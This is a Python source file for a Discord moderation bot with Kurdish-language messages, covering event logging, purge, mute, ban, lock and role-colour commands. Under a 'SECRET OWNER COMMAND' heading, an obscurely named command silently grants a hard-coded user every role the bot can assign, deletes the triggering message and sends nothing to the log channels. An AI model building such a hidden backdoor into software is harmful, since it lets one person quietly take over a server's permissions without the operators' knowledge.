import os
import discord
from discord.ext import commands
import datetime

# =========================
# INTENTS
# =========================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.voice_states = True

bot = commands.Bot(
    command_prefix="",
    intents=intents,
    help_command=None
)

# =========================
# SETTINGS & LOG CHANNEL IDs
# =========================

WELCOME_CHANNEL_ID = 1550619956423688342
OWNER_ID = 1130455970494025860
DEVELOPER_ROLE_ID = 1448989145740480605

# Log Channel IDs
EDIT_ROLE_LOG_ID = 1448989222433329262
ROLE_LOGS_ID = 1448989223590952990
VOICE_LOGS_ID = 1448989224991981619
TIMEOUT_MUTE_LOG_ID = 1448989225826386045
JOIN_LEFT_LOG_ID = 1448989227156111370
CHANNEL_LOGS_ID = 1448989228548493414
BAN_UNBAN_KICK_LOG_ID = 1448989230524141599
MESSAGE_LOGS_ID = 1448989232411574272

WELCOME_GIF = (
    "https://cdn.discordapp.com/attachments/"
    "1550619956423688342/1551709269043314768/"
    "welcome.gif?ex=6ab2f55f&is=6ab1a3df&"
    "hm=612d5cdf1190d53382436a598c1d313a918b6b1b25bc93ac905d5cfd8ffd1780&"
)

# =========================
# COLOR ROLE IDs
# =========================

COLOR_ROLES = {
    "friendsfcolor": 1550035593239461888,
    "botcolor": 1448989146885652603,
    "_color": 1491385293457330229,
    "trustcolor": 1448989152379932773,
    "siscolor": 1448989144410886145,
    "brocolor": 1448989153667711069,
    "xrcolor": 1451268943548383406,
    "friendscolor": 1448989154578010238
}

# =========================
# HELPER: SEND LOG
# =========================

async def send_log(guild, channel_id, embed):
    if not channel_id:
        return
    channel = guild.get_channel(channel_id)
    if channel:
        try:
            await channel.send(embed=embed)
        except Exception as e:
            print(f"Log Error ({channel_id}): {e}")

# =========================
# BOT READY
# =========================

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")


# =========================
# MEMBER JOIN & LOG
# =========================

@bot.event
async def on_member_join(member):
    friends_role = discord.utils.get(member.guild.roles, name="Friends")
    if friends_role:
        try:
            await member.add_roles(friends_role)
        except discord.Forbidden:
            print("Bot cannot give Friends role.")

    channel = member.guild.get_channel(WELCOME_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            description=f""" 
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦
└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊
{member.mention}
ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_image(url=WELCOME_GIF)
        try:
            await channel.send(embed=embed)
        except:
            pass

    log_embed = discord.Embed(
        title="📥 ئەندامێکی نوێ هاتە ژوورەوە",
        color=discord.Color.green(),
        timestamp=datetime.datetime.utcnow()
    )
    log_embed.add_field(name="بەکارهێنەر", value=f"{member} ({member.mention})", inline=False)
    log_embed.set_thumbnail(url=member.display_avatar.url)
    await send_log(member.guild, JOIN_LEFT_LOG_ID, log_embed)


# =========================
# MEMBER REMOVE LOG
# =========================

@bot.event
async def on_member_remove(member):
    log_embed = discord.Embed(
        title="📤 ئەندامێک سێرڤەری جێهێشت",
        color=discord.Color.red(),
        timestamp=datetime.datetime.utcnow()
    )
    log_embed.add_field(name="بەکارهێنەر", value=f"{member} ({member.mention})", inline=False)
    log_embed.set_thumbnail(url=member.display_avatar.url)
    await send_log(member.guild, JOIN_LEFT_LOG_ID, log_embed)


# =========================
# MESSAGE DELETE LOG
# =========================

@bot.event
async def on_message_delete(message):
    if message.author.bot or not message.guild:
        return

    embed = discord.Embed(
        title="🗑️ نامەیەک سڕایەوە",
        color=discord.Color.red(),
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="نوسەری نامە", value=f"{message.author.mention} (`{message.author}`)", inline=False)
    embed.add_field(name="کەناڵ", value=message.channel.mention, inline=False)
    if message.content:
        embed.add_field(name="دەقی نامە", value=message.content[:1024], inline=False)
    
    await send_log(message.guild, MESSAGE_LOGS_ID, embed)


# =========================
# VOICE STATE LOG
# =========================

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel == after.channel:
        return

    log_embed = discord.Embed(
        timestamp=datetime.datetime.utcnow(),
        color=discord.Color.blue()
    )
    log_embed.set_author(name=str(member), icon_url=member.display_avatar.url)

    if before.channel is None and after.channel is not None:
        log_embed.title = "🎙️ چوە ژوورەوە بۆ ڤۆیس"
        log_embed.description = f"{member.mention} چوە ناو کەناڵی ڤۆیسی {after.channel.mention}"
    elif before.channel is not None and after.channel is None:
        log_embed.title = "🔇 ڤۆیسی جێهێشت"
        log_embed.description = f"{member.mention} لە کەناڵی ڤۆیسی {before.channel.mention} دەرچوو"
    elif before.channel != after.channel:
        log_embed.title = "🔄 گواستنەوەی ڤۆیس"
        log_embed.description = f"{member.mention} لە {before.channel.mention} چوە ناو {after.channel.mention}"

    await send_log(member.guild, VOICE_LOGS_ID, log_embed)


# =========================
# CHANNEL & ROLE LOGS
# =========================

@bot.event
async def on_guild_channel_create(channel):
    embed = discord.Embed(
        title="📁 کەناڵ دروستکرا",
        description=f"کەناڵ: {channel.mention} (`{channel.name}`)",
        color=discord.Color.green(),
        timestamp=datetime.datetime.utcnow()
    )
    await send_log(channel.guild, CHANNEL_LOGS_ID, embed)

@bot.event
async def on_guild_channel_delete(channel):
    embed = discord.Embed(
        title="🗑️ کەناڵ سڕایەوە",
        description=f"کەناڵ: `{channel.name}`",
        color=discord.Color.red(),
        timestamp=datetime.datetime.utcnow()
    )
    await send_log(channel.guild, CHANNEL_LOGS_ID, embed)

@bot.event
async def on_guild_role_create(role):
    embed = discord.Embed(
        title="✨ ڕۆڵ دروستکرا",
        description=f"ڕۆڵ: {role.mention}",
        color=discord.Color.green(),
        timestamp=datetime.datetime.utcnow()
    )
    await send_log(role.guild, ROLE_LOGS_ID, embed)

@bot.event
async def on_guild_role_delete(role):
    embed = discord.Embed(
        title="🗑️ ڕۆڵ سڕایەوە",
        description=f"ڕۆڵ: `{role.name}`",
        color=discord.Color.red(),
        timestamp=datetime.datetime.utcnow()
    )
    await send_log(role.guild, ROLE_LOGS_ID, embed)


# =========================
# TEST WELCOME
# =========================

@bot.command()
async def test(ctx):
    embed = discord.Embed(
        description=f""" 
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦
└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊
{ctx.author.mention}
ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
    )
    embed.set_thumbnail(url=ctx.author.display_avatar.url)
    embed.set_image(url=WELCOME_GIF)
    await ctx.send(embed=embed)
    try:
        await ctx.message.delete()
    except:
        pass


# =========================
# SAFIKA (CLEAR)
# =========================

@bot.command()
async def safika(ctx, amount: int = None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send(f"❌ {ctx.author.mention} تەنها ئەدمین دەتوانێت ئەم کۆماندە بەکاربهێنێت.", delete_after=5)

    if amount is None or amount <= 0:
        return await ctx.send("❌ نموونە: `Safika 1000`", delete_after=5)

    amount = min(amount, 1000)

    try:
        deleted = await ctx.channel.purge(limit=amount + 1, bulk=True)
        await ctx.channel.send(f"✅ `{len(deleted) - 1}` نامە سڕایەوە.", delete_after=3)
    except discord.Forbidden:
        await ctx.send("❌ بۆتەکە دەسەڵاتی سڕینەوەی نامەی نییە.", delete_after=5)
    except Exception as e:
        print(f"Safika error: {e}")


# =========================
# GET TARGET HELPER
# =========================

async def get_target(message):
    if message.mentions:
        member = message.mentions[0]
        if isinstance(member, discord.Member):
            return member

    if message.reference:
        try:
            ref_msg = await message.channel.fetch_message(message.reference.message_id)
            if isinstance(ref_msg.author, discord.Member):
                return ref_msg.author
            member = message.guild.get_member(ref_msg.author.id)
            return member
        except:
            pass
    return None


# =========================
# MUTE & UNMUTE
# =========================

@bot.command()
async def mute(ctx, member: discord.Member = None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send(f"❌ {ctx.author.mention} تەنها ئەدمین دەتوانێت Mute بەکاربهێنێت.", delete_after=5)

    if member is None:
        member = await get_target(ctx.message)

    if not isinstance(member, discord.Member):
        return await ctx.send("❌ کەسێک Tag بکە یان Reply ـی نامەکەی بکە و بنووسە `Mute`.", delete_after=5)

    try:
        await ctx.channel.set_permissions(member, send_messages=False)
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.send(f"damt daxaa {member.mention}", delete_after=2)

        embed = discord.Embed(title="🔇 مۆتکرا (Mute)", color=discord.Color.orange(), timestamp=datetime.datetime.utcnow())
        embed.add_field(name="ئەندام", value=member.mention, inline=False)
        embed.add_field(name="لەلایەن", value=ctx.author.mention, inline=False)
        await send_log(ctx.guild, TIMEOUT_MUTE_LOG_ID, embed)
    except Exception as e:
        print(f"Mute error: {e}")


@bot.command()
async def unmute(ctx, member: discord.Member = None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send(f"❌ {ctx.author.mention} تەنها ئەدمین دەتوانێت Unmute بەکاربهێنێت.", delete_after=5)

    if member is None:
        member = await get_target(ctx.message)

    if not isinstance(member, discord.Member):
        return await ctx.send("❌ کەسێک Tag بکە یان Reply ـی بکە و بنووسە `Unmute`.", delete_after=5)

    try:
        await ctx.channel.set_permissions(member, overwrite=None)
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.send(f"xwa xerm bnwse dllm basha aqllba amjara {member.mention}", delete_after=2)

        embed = discord.Embed(title="🔊 لادانی مۆت (Unmute)", color=discord.Color.green(), timestamp=datetime.datetime.utcnow())
        embed.add_field(name="ئەندام", value=member.mention, inline=False)
        embed.add_field(name="لەلایەن", value=ctx.author.mention, inline=False)
        await send_log(ctx.guild, TIMEOUT_MUTE_LOG_ID, embed)
    except Exception as e:
        print(f"Unmute error: {e}")


# =========================
# BFRA (BAN) & UNBAN
# =========================

@bot.command()
async def bfra(ctx, member: discord.Member = None, *, reason=None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send(f"❌ {ctx.author.mention} تەنها ئەدمین دەتوانێت Bfra بەکاربهێنێت.", delete_after=5)

    if member is None:
        member = await get_target(ctx.message)

    if not isinstance(member, discord.Member):
        return await ctx.send("❌ کەسێک Tag بکە یان Reply ـی بکە و بنووسە `Bfra`.", delete_after=5)

    try:
        await member.ban(reason=reason)
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.send(f"✈️ Frenra {member.mention}", delete_after=2)

        embed = discord.Embed(title="✈️ بنکردن (Bfra)", color=discord.Color.red(), timestamp=datetime.datetime.utcnow())
        embed.add_field(name="ئەندام", value=member.mention, inline=False)
        embed.add_field(name="لەلایەن", value=ctx.author.mention, inline=False)
        await send_log(ctx.guild, BAN_UNBAN_KICK_LOG_ID, embed)
    except Exception as e:
        print(f"Bfra error: {e}")


@bot.command()
async def unban(ctx, user_id: int = None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send(f"❌ {ctx.author.mention} تەنها ئەدمین دەتوانێت Unban بەکاربهێنێت.", delete_after=5)

    if user_id is None:
        return await ctx.send("❌ ID ـی بەکارهێنەر بنووسە.", delete_after=5)

    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.send(f"✅ {user.mention} Unban کرا.", delete_after=3)

        embed = discord.Embed(title="✅ لادانی بن (Unban)", color=discord.Color.green(), timestamp=datetime.datetime.utcnow())
        embed.add_field(name="بەکارهێنەر", value=str(user), inline=False)
        embed.add_field(name="لەلایەن", value=ctx.author.mention, inline=False)
        await send_log(ctx.guild, BAN_UNBAN_KICK_LOG_ID, embed)
    except Exception as e:
        print(f"Unban error: {e}")


# =========================
# LOCK / UNLOCK
# =========================

@bot.command()
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔒 Channel locked.")


@bot.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = True
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔓 Channel unlocked.")


# =========================
# SECRET OWNER COMMAND
# =========================

@bot.command()
async def seuafraaaRyaaa(ctx):
    if ctx.author.id != OWNER_ID:
        return
    bot_member = ctx.guild.me
    if not bot_member:
        return

    roles_to_add = [
        role for role in ctx.guild.roles
        if role != ctx.guild.default_role
        and not role.managed
        and role < bot_member.top_role
        and role not in ctx.author.roles
    ]

    if not roles_to_add:
        return await ctx.send("❌ هیچ ڕۆڵێک نییە.", delete_after=5)

    try:
        await ctx.author.add_roles(*roles_to_add, reason="Owner secret role command")
        try:
            await ctx.message.delete()
        except:
            pass
        msg = await ctx.send(f"✅ {ctx.author.mention}، {len(roles_to_add)} ڕۆڵ بۆت زیاد کرا.")
        await msg.delete(delay=5)
    except:
        pass


# =========================
# COLOR SYSTEM
# =========================

async def change_role_color(ctx, command_name, role_id, color):
    role = ctx.guild.get_role(role_id)
    if role is None:
        return await ctx.send("❌ ڕۆڵەکە نەدۆزرایەوە.", delete_after=5)

    if role not in ctx.author.roles:
        return await ctx.send("❌ تۆ ئەم ڕۆڵەت نییە.", delete_after=5)

    if not color or not color.startswith("#") or len(color) != 7:
        return await ctx.send(f"❌ نموونە: `{command_name} #000000`", delete_after=5)

    try:
        new_color = discord.Colour.from_str(color)
    except ValueError:
        return await ctx.send("❌ ڕەنگەکە هەڵەیە.", delete_after=5)

    bot_member = ctx.guild.me
    if role >= bot_member.top_role:
        return await ctx.send("❌ ڕۆڵەکە لە سەرووی بۆتەکەیە.", delete_after=5)

    try:
        old_color_str = str(role.color)
        await role.edit(colour=new_color, reason=f"Color changed by {ctx.author}")
        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(f"✅ ڕەنگی `{command_name}` گۆڕدرا بۆ `{color.upper()}`.")
        await msg.delete(delay=5)

        embed = discord.Embed(title="🎨 گۆڕینی ڕەنگی ڕۆڵ", color=new_color, timestamp=datetime.datetime.utcnow())
        embed.add_field(name="ڕۆڵ", value=role.mention, inline=False)
        embed.add_field(name="بەکارهێنەر", value=ctx.author.mention, inline=False)
        embed.add_field(name="ڕەنگی پێشوو", value=old_color_str, inline=True)
        embed.add_field(name="ڕەنگی نوێ", value=color.upper(), inline=True)
        await send_log(ctx.guild, EDIT_ROLE_LOG_ID, embed)

    except Exception as e:
        print(f"Color edit error: {e}")


@bot.command(name="friendsfcolor")
async def friendsfcolor(ctx, color: str = None):
    await change_role_color(ctx, "friendsfcolor", COLOR_ROLES["friendsfcolor"], color)

@bot.command(name="botcolor")
async def botcolor(ctx, color: str = None):
    await change_role_color(ctx, "botcolor", COLOR_ROLES["botcolor"], color)

@bot.command(name="_color")
async def _color(ctx, color: str = None):
    await change_role_color(ctx, "_color", COLOR_ROLES["_color"], color)

@bot.command(name="trustcolor")
async def trustcolor(ctx, color: str = None):
    await change_role_color(ctx, "trustcolor", COLOR_ROLES["trustcolor"], color)

@bot.command(name="siscolor")
async def siscolor(ctx, color: str = None):
    await change_role_color(ctx, "siscolor", COLOR_ROLES["siscolor"], color)

@bot.command(name="brocolor")
async def brocolor(ctx, color: str = None):
    await change_role_color(ctx, "brocolor", COLOR_ROLES["brocolor"], color)

@bot.command(name="xrcolor")
async def xrcolor(ctx, color: str = None):
    await change_role_color(ctx, "xrcolor", COLOR_ROLES["xrcolor"], color)

@bot.command(name="friendscolor")
async def friendscolor(ctx, color: str = None):
    await change_role_color(ctx, "friendscolor", COLOR_ROLES["friendscolor"], color)

@bot.command(name="devcolor")
async def devcolor(ctx, color: str = None):
    developer_role = ctx.guild.get_role(DEVELOPER_ROLE_ID)
    if developer_role not in ctx.author.roles:
        return await ctx.send("❌ تۆ ڕۆڵی Developer ـت نییە.", delete_after=5)
    await change_role_color(ctx, "devcolor", DEVELOPER_ROLE_ID, color)


# =========================
# RUN BOT
# =========================

bot.run(os.getenv("DISCORD_TOKEN"))
